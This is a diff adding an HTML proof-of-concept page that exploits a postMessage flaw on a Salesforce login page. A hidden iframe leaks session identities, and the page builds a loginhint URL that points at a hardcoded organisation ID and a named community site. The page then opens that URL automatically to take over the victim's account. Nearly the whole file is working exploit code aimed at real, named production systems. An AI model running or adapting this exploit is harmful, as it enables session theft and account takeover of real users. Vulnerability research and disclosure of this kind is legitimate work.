@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Salesforce Account Takeover PoC</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        h1, h2 { color: #c23934; }
+        pre { background-color: #f0f0f0; padding: 15px; border: 1px solid #ccc; white-space: pre-wrap; word-wrap: break-word; }
+        #exploit-url { font-weight: bold; color: #006dcc; }
+        .note { font-style: italic; color: #555; }
+    </style>
+</head>
+<body>
+    <h1>Salesforce Account Takeover PoC</h1>
+    <p>This page exploits a postMessage vulnerability to leak session data and then automatically attempts account takeover.</p>
+    <p class="note">Please open the Developer Console (F12) to observe the full interaction.</p>
+    <div id="results"></div>
+
+    <iframe id="sf_iframe" src="https://login.salesforce.com/login/sessionserver212.html" style="display:none;"></iframe>
+
+    <script>
+        // Target Configuration
+        const TARGET_ORG_ID = "00D4x0000050RXf"; // Verily's Org ID
+        const TARGET_COMMUNITY_URL = "https://clientdev.signalpath.com/s/";
+
+        // 1. Wait for the iframe to load
+        document.getElementById('sf_iframe').onload = function() {
+            console.log("[PoC] Iframe loaded. Sending 'getIdentities' command...");
+            var iframe_window = document.getElementById('sf_iframe').contentWindow;
+            var message = { cmd: "sfdcsession::getIdentities", id: 1, get: [] };
+            iframe_window.postMessage(JSON.stringify(message), "https://login.salesforce.com");
+        };
+
+        // 2. Listen for the response from the iframe
+        window.addEventListener('message', function(event) {
+            if (event.origin !== "https://login.salesforce.com") return;
+            console.log("[PoC] Message received from Salesforce origin:", event.origin);
+            console.log("[PoC] RAW LEAKED DATA:", event.data);
+
+            var leakedData = JSON.parse(event.data);
+
+            // 3. Check if this is the message containing the identities
+            if (leakedData.cmd === "sfdcsession::getIdentities" && leakedData.identities) {
+                console.log("[PoC] SUCCESS! Leaked Identities Found!");
+                
+                // Display the raw leaked data on the page
+                let resultsDiv = document.getElementById('results');
+                resultsDiv.innerHTML += "<h2>SUCCESS! Leaked Identities Found!</h2><pre>" + JSON.stringify(leakedData.identities, null, 2) + "</pre>";
+                
+                // 4. Find the first active identity to use for the takeover
+                let victimIdentity = null;
+                for (const key in leakedData.identities) {
+                    const identity = leakedData.identities[key];
+                    if (identity.active) {
+                        victimIdentity = identity;
+                        break;
+                    }
+                }
+
+                if (victimIdentity) {
+                    console.log("[PoC] Found active victim identity:", victimIdentity);
+
+                    // 5. Construct the final exploit URL
+                    const victimUserId = victimIdentity.identity.uid;
+                    const victimInstanceUrl = victimIdentity.identity.instance;
+                    
+                    const exploitUrl = `${victimInstanceUrl}/secur/loginhint?o=${TARGET_ORG_ID}&u=${victimUserId}&retURL=${encodeURIComponent(TARGET_COMMUNITY_URL)}`;
+                    
+                    console.log("[PoC] CONSTRUCTED EXPLOIT URL:", exploitUrl);
+                    resultsDiv.innerHTML += `<h2>SUCCESS! Constructed Account Takeover URL:</h2><pre id="exploit-url">${exploitUrl}</pre>`;
+
+                    // 6. The "Decisive Punch": Automatically open the exploit URL in a new tab
+                    console.log("[PoC] Attempting to open exploit URL in a new tab to demonstrate takeover...");
+                    resultsDiv.innerHTML += "<p><strong>Attempting automatic account takeover in a new tab...</strong></p>";
+                    window.open(exploitUrl, '_blank');
+
+                } else {
+                    resultsDiv.innerHTML += "<p><strong>No active identities found to exploit.</strong></p>";
+                }
+            }
+        });
+    </script>
+</body>
+</html>
